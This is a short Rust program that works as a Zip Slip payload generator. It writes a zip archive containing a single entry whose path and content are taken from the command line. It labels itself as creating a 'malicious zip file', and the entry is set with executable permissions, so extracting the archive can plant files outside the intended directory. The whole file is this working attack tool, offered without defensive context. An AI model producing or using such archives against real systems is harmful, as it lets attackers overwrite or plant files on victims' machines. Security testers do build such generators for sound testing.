use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::env;
use zip::write::SimpleFileOptions;
use zip::ZipWriter;

fn main() {
    std::process::exit(real_main());
}

fn real_main() -> i32 {
    // Parse command-line arguments
    let args: Vec<String> = env::args().collect();
    if args.len() != 4 {
        println!("Usage: {} --path=\"path/to/slip\" --data=\"file content\" output.zip", args[0]);
        return 1;
    }

    // Retrieve command-line values
    let malicious_path = args[1].replace("--path=", "");
    let file_content = args[2].replace("--data=", "");
    let output_zip = &args[3];

    // Create the malicious zip file with the provided parameters
    match create_malicious_zip(output_zip, &malicious_path, &file_content) {
        Ok(_) => println!("Malicious zip file written to {output_zip}"),
        Err(e) => println!("Error: {e:?}"),
    }

    0
}

// Function to create the malicious zip file
fn create_malicious_zip(filename: &str, malicious_path: &str, file_content: &str) -> zip::result::ZipResult<()> {
    let path = Path::new(filename);
    let file = File::create(path).expect("Failed to create the zip file");

    let mut zip = ZipWriter::new(file);

    // Options for creating the zip file
    let options = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .unix_permissions(0o755);

    // **Malicious File Path** provided from the command line
    zip.start_file(malicious_path, options)?;
    zip.write_all(file_content.as_bytes())?;

    // Finish the zip archive
    zip.finish()?;
    Ok(())
}
